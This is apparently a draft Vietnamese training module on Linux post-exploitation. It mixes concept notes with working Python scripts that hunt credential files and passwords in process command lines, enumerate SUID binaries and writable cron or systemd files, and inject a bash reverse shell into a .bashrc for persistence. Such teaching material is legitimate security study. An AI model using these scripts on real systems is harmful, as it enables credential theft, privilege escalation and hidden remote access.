# Post exploitation and Lateral movement
## 1.1. Post Exploitation là gì?

Tính đến hiện tại, chưa có một chuẩn định nghĩa nào dành cho Post-Exploitation. Tuy nhiên, theo như định nghĩa của (rapid7)[https://docs.rapid7.com/metasploit/about-post-exploitation/] thì Post-Exploitation bao gồm tất cả những hành động của threat actor sau khi threat actor thiết lập được phiên kiểm soát hệ thống từ xa. Việc thiết lập phiên kết nối có thể bởi các cách khai thác sau:
1. Tấn công social engineering.
2. Khai thác lỗ hổng bảo mật.
3. Tấn công brute force.

Nếu khai thác thành công, phiên kết nối có thể có quyền truy cập nằm trong 3 trường hợp sau:
1. Quyền cao nhất của hệ thống (`root` hoặc `NT SYSTEM`), nhưng điều này khá hiếm (trừ trường hợp thiết bị IOT có mật khẩu của `root` là mật khẩu mặc định).
2. Quyền của logon user.
3. Quyền của daemon user chạy dịch vụ mạng, ví dụ `www-data` hoặc `nginx`.

Như vậy, bước tiếp theo của threat actor sẽ là can thiệp vào tài nguyên hệ thống bị compromise nhằm:
1. Tìm kiếm điểm yếu trong hệ thống để khai thác nhằm nâng cấp quyền kiểm soát hệ thống.
2. Sửa đổi tài nguyên hệ thống nhằm duy trì khả năng kiểm soát từ xa để phòng trường hợp phiên hiện tại bị vô hiệu hóa.
3. Thu thập và phân tích các thông tin nhạy cảm tồn tại trong hệ thống, từ đó làm bàn đạp để mở rộng phạm vi kiểm soát sang các hệ thống, dịch vụ hoặc tài nguyên khác có liên quan. Các dịch vụ này có thể là các dịch vụ mạng nội bộ của một công ty, hoặc một dịch vụ liên quan tới cá nhân như banking.

Các hành động trên bao gồm các tactic Discovery, Credential Access, Collection, Persistence. Các thông tin thu thập được sẽ được sử dụng cho Lateral Movement, Privilege Escalation, Exfiltration. Những tactic này được chia theo MITRE matrix.

Để hình dung thực tế thì một hệ thống bị compromise có thể được chia làm 2 nhóm: máy người dùng cá nhân và máy người dùng doanh nghiệp. Đối với máy người dùng cá nhân, có rất nhiều dữ liệu số và các dịch vụ số.

![User's connection with cyber services, Researchergate](https://www.researchgate.net/publication/366670283/figure/fig1/AS:11431281110503228@1672583926537/dentity-Management-Services-Digital-Identity-2020.ppm)

Không dừng lại ở đó, máy bị compromise còn có thể kết nối tới các thiết bị khác. Nếu nơi đang sống càng có nhiều thiết bị thông minh, thì tức là càng có nhiều thiết bị nằm trong phạm vi bị tấn công lây lan.

![Smart home infographic, alamy](https://c7.alamy.com/comp/2EBY1FF/internet-of-things-smart-home-appliances-control-with-wearable-electronic-devices-colorful-isometric-infographic-poster-vector-illustration-2EBY1FF.jpg)

Hoặc đối với hệ thống doanh nghiệp, mô hình thiết kế có thể rất phức tạp, đồng nghĩa với việc có nhiều hệ thống có nguy cơ bị xâm nhập nếu một máy trong mạng nội bộ bị kiểm soát từ xa.

![Netflix's High level system architecture, geeksforgeeks](https://media.geeksforgeeks.org/wp-content/cdn-uploads/20210128214233/Netflix-High-Level-System-Architecture.png)

Với một mô hình hệ thống như vậy, số lượng các dịch vụ hoặc công nghệ khác nhau được sử dụng cũng sẽ rất đa dạng. Một sai sót nhỏ trong cấu hình, hoặc mật khẩu lưu ở trên máy bị kiểm soát cũng có thể dẫn đến việc những hệ thống quan trọng bị kiểm soát.

![Netflix's tech stack, bytebytego](https://substack-post-media.s3.amazonaws.com/public/images/a96d8b37-03f5-43b3-af22-bea2ee7a8ebb_1280x1810.jpeg)

Như vậy, việc có quyền kiểm soát một hệ thống chưa phải là điểm kết thúc mà chỉ là một bàn đạp để có thể mở rộng tấn công lên một quy mô lớn hơn.

## System enumeration: những thứ threat actor thu thập và phân tích.
đầu tiên, phải thu thập thông tin hệ thống để phục vụ cho các bước tiếp theo
Mục tiêu tìm kiếm:
1. Thông tin về hệ thống: hiểu rõ hơn về hệ thống và tìm kiếm software chưa được vá lỗ hổng
2. Tài nguyên có thể kiểm soát được (bởi quyền của phiên kiểm soát hiện tại): tìm kiếm điểm yếu hệ thống (mà threat actor có thể kiểm soát) nhằm nâng cao tối đa quyền, hoặc tìm kiếm credentials, hoặc thông tin nội bộ, hoặc chỉnh sửa dữ liệu để duy trì kiểm soát.

Để thực hiện các công việc này, threat actor phải chạy một số đoạn lệnh đặc thù, có thể đi kèm trong backdoor đang được sử dụng, hoặc phải tải lên =>
1. Nếu upload lên: dấu vết lưu file
2. Nếu sử dụng phương pháp chạy lệnh hệ thống: show nhiều thứ trong process tree
3. in memory: (liệu có vấn đề gì không?)

Trong quá trình thực hiện, các hành động có thể có những hành vi khác nhau từ đọc file cho đến ghi file. Các hành động này chiếm dụng tài nguyên và có thể gây noise hệ thống, dễ bị phát hiện => cần stealthy.


## Credential collection => "mỏ vàng"
- Ở level daemon user: thu thập được credential được ưeb app sử dụng: credential truy cập db của ưeb, có thể crednetial login vào web panel, ... thậm chí credential được web app sử dụng để kết nối tới dịch vụ bên ngoài. Ngoài ra, dev có thể lưu những credential tạm như trong source code, ...
- level normal user: file password (dùng pahanf mềm uqanr lý password lưu), trình duyệt, các desktop app / web app, ... , ssh key, .. (tùy thuộc server hay desktop); tìm trong history của bash hoặc db command (ví dụ set password cố lưu history log của interpreter SQL)
- git conffig, backup file, command đang chạy, ... (todo check vhost)
- script chạy theo schedule có thể có crednetial plaintext do sys-admin sử dụng.
- Credential yếu, reuse trong các hệ thống khác nhau

## Priv esc: nâng cao
Khi sản phẩm được đưa vào quá trình vận hành, có thể có nhiều sai sót xảy ra dẫn đến lỗ hổng bảo mật:
1. Hệ thống không được cập nhật security patches
2. Hệ thống không được audit cẩn thận hoặc không được hardening đúng mức.
3. Cấp thừa quyền để thực hiện một số chức năng nhất định dẫn đến low privilege user (hoặc daemon user) có thể can thiệp được resource của user khác. (một trong những mục tiêu sẽ là thay đổi luồng logic hoạt động của 1 chương trình để có thể nâng cấp khả năng kiểm soát hệ thống)
4. Cập nhật và áp dụng phiên bản mới có thể phá vỡ cấu hình cũ (backward compability) hoặc chức năng được cập nhật xuất hiện lỗ hổng mới.

Ở trong module này, ta chỉ thực hiện công việc thu thập các điểm yếu (real world software exploitation học ở module sau)

=> Tactic thực hiện (TODO chuyển sang phần practice)
- Mis-configuration dẫn đến lộ credential hoặc cho phép sửa đổi được tài nguyên hệ thống:
 + Cho phép sửa đổi cronjob hoặc service unit
 + Writable file / folder cho phép chèn mã độc
- Cấp quá quyền cho phép: SUID binaries hoặc sudoders commands, Capabilities của file (Linux capability).
TODO giari thích tại sao tìm trong default (usr/bin/), biến môi trường (add thêm?), opt (cài thêm)
TODO: tận dụng tinh năng hệ thống và một số misconfig khác để thực hiện priv esc?


## lateral movement: đi xa
- Ở level daemon user: vẫn có thể xem được netstat để xem connection nội bộ, hoặc chạy được tool để scan trong network range
- vẫn có thể xem xét một vài thông tin cơ bản
- nếu có ưeb => xem được các thông tin về db, vhost, container, ... (hoặc credential tới các dịch vụ khác ví dụ cloud)

## Persistence: Tìm kiếm vị trí mà threat actor có thể truy cập và kiểm soát
Tại sao cần persistence?
    - Duy trì quyền kiểm soát qua reboot, patch, hay incident response.
    - Đảm bảo access ngay cả khi credential bị đổi hoặc machine / service bị restart

Persistence ở những vị trí nào?
=> Tùy theo quyền của phiên hiện tại mà có thể sử dụng các biện pháp khac nhau:
- Đối với daemon user: để lại ưeb shell (todo: check có cách nào tạo persistence thông qua web server)
- Đối với normal user: on event and on-logon ví dụ như bashrc, hoặc add thông tin vào ssh key, ... hoặc đối với X11 thì có chỗ khác, ...
- System: ??

=> một số vị trí
 + Sẽ có những component sử dụng scripting, thực thi scripting. Ví dụ: ssh banner, hook script
 + On-event persistence: Chương trình được thực thi khi 1 event nhất định được thực hiện TODO hoàn thiện
 + Login persistence: chương trình được thực thi khi được boot TODO hoàn thiện
 + Vị trí càng ít người biết, càng khó bị phát hiện
- Vị trí:
    - **Activities:**
    - Logon persistence
        - System daemon
        - X-11 auto start
    - Schedule persistence:
        - systemd timer
        - cron
    - Event trigger persistence:
        - Shell config modification (`.bashrc`)
        - Udev rules
        - Hooking scripts (network hooking script for example)
    **Resources**:
    - **MySQL Plugin Load:** https://dev.mysql.com/doc/refman/8.4/en/plugin-loading.html
    - **Systemd as user**: https://serverfault.com/questions/841099/systemd-grant-an-unprivileged-user-permission-to-alter-one-specific-service
    - **System hook script locations:**
        - `/etc/needrestart/hook.d/`
        - `/etc/network/if-down.d/`
        - `/etc/update-motd.d`
    + Kernel module, bootloader, firmware, ...
    + Advanced: Memory persistence (?)


====

# Thực hành
- Tạo 1 script sử dụng os walkdir để tìm file có file name nằm trong list `goldmine = ["config.php", ".git-credentials", "id.rsa"]`. Lưu ý: walk dir khác walk dir đệ quy
```
import os

# Danh sách các tên tệp mục tiêu cần tìm
goldmine = ["config.php", ".git-credentials", "id.rsa"]

def find_sensitive_files(start_dir):
    """
    Duyệt qua các thư mục bắt đầu từ start_dir và tìm các tệp có tên trong danh sách goldmine.
    """
    print(f"[*] Bắt đầu tìm kiếm từ thư mục: {os.path.abspath(start_dir)}")
    print(f"[*] Các tệp cần tìm: {goldmine}\n")

    found_count = 0

    # os.walk trả về tuple (root, dirs, files) cho mỗi thư mục
    for root, _, files in os.walk(start_dir):
        # Lặp qua các tệp trong thư mục hiện tại (root)
        for file_name in files:
            # Kiểm tra xem tên tệp có nằm trong danh sách goldmine không
            if file_name in goldmine:
                # Tìm thấy tệp!
                full_path = os.path.join(root, file_name)

                # In đường dẫn tuyệt đối của tệp tìm thấy
                print(f"[+] Đã tìm thấy: {os.path.abspath(full_path)}")
                found_count += 1

    if found_count == 0:
        print("\n[!] Không tìm thấy tệp nào trong danh sách.")
    else:
        print(f"\n[*] Tổng cộng đã tìm thấy {found_count} tệp.")

if __name__ == "__main__":
    # Đặt thư mục bắt đầu tìm kiếm là thư mục hiện tại ('.')
    find_sensitive_files('/tmp/')
```
- Nghiên cứu procfs, tạo 1 script đọc cmdline trong procfs của toàn bộ tiến trình đang chạy
```
import os

# Danh sách các chuỗi cần tìm
SENSITIVE_KEYWORDS = ["password=", "passwd=", "pass="]

def check_procfs_cmdlines():
    """
    Duyệt qua /proc/[PID]/cmdline để tìm các chuỗi nhạy cảm.
    """

    # Chỉ hoạt động trên hệ thống giống Unix/Linux
    if not os.path.isdir('/proc'):
        print("[!] Không tìm thấy thư mục /proc. Script này chỉ hoạt động trên Linux/Unix.")
        return
    print("[*] Bắt đầu kiểm tra các tham số dòng lệnh trong /proc...")
    print(f"[*] Các từ khóa nhạy cảm: {SENSITIVE_KEYWORDS}\n")

    found_secrets = False

    # 1. Lặp qua các thư mục con trong /proc
    for entry in os.listdir('/proc'):
        # Kiểm tra xem tên thư mục có phải là PID (chỉ gồm số) không
        if entry.isdigit():
            pid = entry
            cmdline_path = os.path.join('/proc', pid, 'cmdline')

            # Kiểm tra xem file cmdline có tồn tại không
            if os.path.exists(cmdline_path):
                try:
                    # 2. Đọc nội dung file cmdline
                    # cmdline chứa các tham số cách nhau bởi ký tự null (\x00)
                    with open(cmdline_path, 'rb') as f:
                        content = f.read()

                    # Thay thế ký tự null bằng khoảng trắng để dễ đọc
                    cmdline_str = content.replace(b'\x00', b' ').decode('utf-8', errors='ignore').strip()

                    # 3. Kiểm tra các từ khóa nhạy cảm
                    for keyword in SENSITIVE_KEYWORDS:
                        if keyword in cmdline_str:
                            found_secrets = True
                            # In ra PID và tham số bị lộ
                            print("--------------------------------------------------")
                            print(f"[+] PHÁT HIỆN bí mật trong tiến trình (PID: {pid}):")
                            print(f"    Dòng lệnh đầy đủ: {cmdline_str}")
                            print("--------------------------------------------------")
                            # Đã tìm thấy một khớp cho PID này, chuyển sang PID tiếp theo
                            break
                except Exception:
                    pass

    if not found_secrets:
        print("\n[*] Không tìm thấy tham số nhạy cảm nào khớp với danh sách từ khóa.")

if __name__ == '__main__':
    check_procfs_cmdlines()
```

- Bài tập: Đọc bash history và trích xuất credential. Recommend iterate từng dòng.

## 2.2 Priv Escalation

TODO giari thích tại sao tìm trong default (usr/bin/), biến môi trường (add thêm?), opt (cài thêm)

### Example
- Tạo script tìm suid binary (advanced: SUID bởi owner nào)
```
import os
import stat
import pwd
import getpass

# Danh sách các thư mục cần quét. Quét toàn bộ '/' cần quyền root.
SCAN_DIRS = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin']
# Loại bỏ các thư mục /proc, /sys, /dev để tránh lỗi và tăng tốc độ
EXCLUDE_DIRS = ['/proc', '/sys', '/dev', '/mnt', '/media', '/run', '/tmp']

def find_dangerous_suid_binaries():
    """
    Quét các thư mục, tìm các tệp SUID và kiểm tra điều kiện "nguy hiểm".
    """
    # Lấy thông tin về user đang thực thi script
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: {current_username} (UID: {current_uid})")
    print(f"[*] Bắt đầu quét các thư mục: {SCAN_DIRS}\n")

    found_count = 0

    # Lặp qua các thư mục đã xác định
    for scan_dir in SCAN_DIRS:
        if not os.path.isdir(scan_dir):
            continue

        for root, dirs, files in os.walk(scan_dir, topdown=True):
            # Loại bỏ các thư mục đã định nghĩa (sửa đổi dirs tại chỗ)
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]

            for file_name in files:
                full_path = os.path.join(root, file_name)

                # Bỏ qua nếu không phải là file hoặc không thể truy cập
                if not os.path.isfile(full_path):
                    continue

                try:
                    # 1. Lấy thông tin stat của file
                    file_stat = os.lstat(full_path)
                    mode = file_stat.st_mode

                    # 2. Kiểm tra bit SUID
                    if mode & stat.S_ISUID:
                        found_count += 1

                        # 3. Lấy Owner UID và User/Group Execute Permission
                        file_owner_uid = file_stat.st_uid
                        is_executable = os.access(full_path, os.X_OK)

                        # Dịch UID thành username
                        try:
                            file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                        except KeyError:
                            file_owner_name = f"Unknown UID ({file_owner_uid})"

                        # 4. Kiểm tra điều kiện "Nguy hiểm"
                        # Nguy hiểm khi: (Owner khác User đang thực thi) VÀ (User đang thực thi có quyền Execute)
                        if file_owner_uid != current_uid and is_executable:
                            print(f" **Tìm thấy SUID binary nguy hiểm (Tiềm năng):** {full_path}")
                            print(f"   - Owner: {file_owner_name} (UID: {file_owner_uid})")
                            print(f"   - User hiện tại ({current_username}) CÓ quyền thực thi.")
                            print("-" * 50)
                except PermissionError:
                    # Bỏ qua các file mà script không có quyền truy cập thông tin
                    pass
                except OSError:
                    # Bỏ qua các file bị xóa trong quá trình quét
                    pass

    if found_count == 0:
        print("\n[!] Không tìm thấy SUID binary nào trong các thư mục được quét.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} SUID binary.")

if __name__ == "__main__":
    find_dangerous_suid_binaries()
```

- Tạo script tìm writable folder (user hiện tại write được folder user khác)
```
import os
import getpass
import pwd

# Danh sách các thư mục cần quét. Quét toàn bộ '/' cần quyền root.
SCAN_DIRS = ['/home', '/var/tmp', '/tmp', '/usr/local'] 
# Loại bỏ các thư mục /proc, /sys, /dev để tránh lỗi và tăng tốc độ
EXCLUDE_DIRS = ['/proc', '/sys', '/dev', '/mnt', '/media', '/run', '/tmp']

def find_writable_foreign_folders():
    """
    Duyệt qua các thư mục, tìm các thư mục có thể ghi được (writable)
    nhưng Owner lại khác user đang chạy script.
    """
    # Lấy thông tin về user đang thực thi script
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: **{current_username}** (UID: {current_uid})")
    print(f"[*] Bắt đầu quét các thư mục: {SCAN_DIRS}\n")
    found_count = 0

    # Lặp qua các thư mục đã xác định
    for scan_dir in SCAN_DIRS:
        if not os.path.isdir(scan_dir):
            continue

        # os.walk để duyệt qua các thư mục và thư mục con
        for root, dirs, _ in os.walk(scan_dir, topdown=True):
            # Loại bỏ các thư mục đã định nghĩa (sửa đổi dirs tại chỗ)
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]

            for dir_name in dirs:
                full_path = os.path.join(root, dir_name)
                try:
                    # 1. Lấy thông tin stat của thư mục
                    file_stat = os.lstat(full_path)
                    # 2. Kiểm tra quyền ghi (writable)
                    # os.access(path, os.W_OK) kiểm tra xem user hiện tại có quyền ghi không.
                    is_writable = os.access(full_path, os.W_OK)
                    if is_writable:
                        file_owner_uid = file_stat.st_uid
                        # 3. Kiểm tra điều kiện chính: Có thể ghi VÀ Owner khác
                        if file_owner_uid != current_uid:
                            found_count += 1
                            # Dịch UID thành username
                            try:
                                file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                            except KeyError:
                                file_owner_name = f"Unknown UID ({file_owner_uid})"

                            print(f" **Tìm thấy thư mục có thể ghi Owner khác:** {full_path}")
                            print(f"   - **Owner:** {file_owner_name} (UID: {file_owner_uid})")
                            print(f"   - User hiện tại ({current_username}) **CÓ quyền GHI** vào thư mục này.")
                            print("-" * 50)
                except PermissionError:
                    # Bỏ qua các thư mục mà script không có quyền truy cập thông tin
                    pass
                except OSError:
                    # Bỏ qua các lỗi khác (ví dụ: file/thư mục bị xóa trong quá trình quét)
                    pass

    if found_count == 0:
        print("\n[*] Hoàn tất quét. Không tìm thấy thư mục writable nào có owner khác user hiện tại.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} thư mục tiềm năng.")

if __name__ == "__main__":
    find_writable_foreign_folders()
```

- Tạo script tìm system service có thể ghi được:
```
import os
import getpass
import pwd

# Danh sách các thư mục chứa các tệp cấu hình quan trọng cần kiểm tra
CONFIG_PATHS = [
    # Cronjob Files
    '/etc/crontab',
    '/etc/cron.d',
    '/etc/cron.hourly',
    '/etc/cron.daily',
    '/etc/cron.weekly',
    '/etc/cron.monthly',

    # Systemd Service Files
    '/etc/systemd/system',
    '/lib/systemd/system',

    # Init.d/SysVinit Files
    '/etc/init.d',

    # At Job Files (ít phổ biến hơn)
    '/var/spool/cron/atjobs', 
]

def is_writable_by_current_user(filepath):
    """Kiểm tra xem user hiện tại có quyền ghi vào tệp/thư mục không."""
    return os.access(filepath, os.W_OK)

def find_writable_config_files():
    """
    Duyệt qua các đường dẫn cấu hình, tìm các tệp có thể ghi được và 
    Owner khác với user hiện tại.
    """
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: **{current_username}** (UID: {current_uid})")
    print("[*] Bắt đầu quét các thư mục/tệp cấu hình quan trọng...\n")
    found_count = 0

    # Lặp qua các đường dẫn đã định nghĩa
    for path in CONFIG_PATHS:
        if not os.path.exists(path):
            continue

        if os.path.isfile(path):
            # Nếu là một tệp (ví dụ: /etc/crontab)
            files_to_check = [path]
        else:
            # Nếu là một thư mục (ví dụ: /etc/cron.d)
            try:
                # Lấy tất cả tệp/thư mục trong thư mục con
                files_to_check = [os.path.join(path, f) for f in os.listdir(path)]
            except PermissionError:
                continue

        for full_path in files_to_check:
            # Chỉ kiểm tra các tệp, bỏ qua các thư mục con trong thư mục cron/systemd
            # Bỏ qua symlink vì symlink luôn hiển thị quyền write (mặc dù k được)
            if not os.path.isfile(full_path) and os.path.islink(full_path):
                continue

            try:
                # 1. Kiểm tra quyền ghi
                if is_writable_by_current_user(full_path):
                    file_stat = os.lstat(full_path)
                    file_owner_uid = file_stat.st_uid
                    # 2. Kiểm tra Owner
                    file_owner_name = "Unknown"
                    try:
                        file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                    except KeyError:
                        pass # UID không tồn tại

                    # Điều kiện báo cáo: Có thể ghi VÀ Owner khác root (hoặc khác user hiện tại nếu muốn)
                    # Ở đây ta ưu tiên tìm các file có thể ghi được mà chạy với quyền root (UID=0)
                    if file_owner_uid == 0:
                        # Thư mục/tệp cấu hình chạy với quyền root mà user thường có thể ghi
                        found_count += 1
                        print(f" **PHÁT HIỆN tệp cấu hình Writable & Root Owner:** {full_path}")
                        print("   - **Owner:** root (UID: 0)")
                        print(f"   - User hiện tại ({current_username}) **CÓ quyền GHI** vào tệp này.")
                        print("-" * 60)
                    # (Tùy chọn) In ra tất cả các file writable có owner khác user hiện tại
                    elif file_owner_uid != current_uid:
                        print(f"[+] Tìm thấy Writable Config File Owner khác: {full_path}")
                        print(f"   - Owner: {file_owner_name}")
                        print("-" * 60)

            except PermissionError:
                # Bỏ qua các file mà script không có quyền truy cập thông tin
                pass
            except OSError:
                # Bỏ qua các lỗi khác
                pass

    if found_count == 0:
        print("\n[*] Hoàn tất quét. Không tìm thấy tệp cấu hình Writable (Owner root) nào.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} tệp cấu hình Root Writable.")

if __name__ == "__main__":
    find_writable_config_files()
```

Bài tập:
- Tạo script kiểm tra version của kernel, so sánh xem nó có tồn tại lỗ hổng hay không (làm logic đơn giản, ví dụ version "7.1.2" thì iterate so sánh version sau đó show ra 1 bug nào đó đã thấy trên mạng, lưu sẵn vào script) => Mô phỏng tìm unpatched có exploit, sau đó phát triển ra với process, service
- Enumerate kernel modules
- Enumerate namespace and Cgroup escape (container breakout)

## 2.3 Persistence


### Example:
- Thêm 1 entry persistence vào 1 bashrc (ở đây sử dụng ví dụ là `/tmp/.bashrc`).
```
import os

# --- THÔNG SỐ CẦN THAY ĐỔI ---
# ĐỊA CHỈ IP và CỔNG CỦA MÁY ATTACKER (Server lắng nghe)
ATTACKER_IP = "127.0.0.1"  # Thay thế bằng IP thực tế
ATTACKER_PORT = 9001            # Thay thế bằng cổng lắng nghe thực tế
# -----------------------------

# Đường dẫn tệp mục tiêu
TARGET_FILE = "/tmp/.bashrc"

# Lệnh Reverse Shell (Bash)
# Lệnh này sẽ được chạy mỗi khi người dùng mở một terminal mới
REVERSE_SHELL_COMMAND = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"

def inject_reverse_shell():
    """
    Kiểm tra sự tồn tại của /tmp/.bashrc và chèn lệnh reverse shell.
    """
    print(f"[*] Đang kiểm tra tệp: {TARGET_FILE}")

    # 1. Kiểm tra sự tồn tại của tệp
    if os.path.exists(TARGET_FILE):
        print(f"[+] Tệp tồn tại: {TARGET_FILE}")
        # 2. Kiểm tra xem user có quyền ghi vào tệp không
        if os.access(TARGET_FILE, os.W_OK):
            print("[+] Có quyền ghi (Writable). Tiến hành chèn lệnh...")
            try:
                # 3. Mở tệp ở chế độ 'a' (append) để thêm vào cuối
                with open(TARGET_FILE, 'a') as f:
                    # Thêm ký tự xuống dòng trước lệnh (đảm bảo lệnh mới bắt đầu trên dòng mới)
                    f.write("\n\n# START INJECTED REVERSE SHELL\n")
                    f.write(REVERSE_SHELL_COMMAND)
                    f.write("\n# END INJECTED REVERSE SHELL\n")
                print(" CHÈN THÀNH CÔNG!")
                print(f"   Lệnh đã được chèn: {REVERSE_SHELL_COMMAND}")
                print("\n[!] Lệnh Reverse Shell sẽ được kích hoạt khi user khởi động shell mới.")
            except Exception as e:
                print(f"[-] LỖI: Không thể ghi vào tệp: {e}")
        else:
            print("[-] KHÔNG có quyền ghi (Writable) vào tệp. Không thể chèn lệnh.")
    else:
        print(f"[-] Tệp KHÔNG tồn tại: {TARGET_FILE}")

if __name__ == '__main__':
    inject_reverse_shell()

```
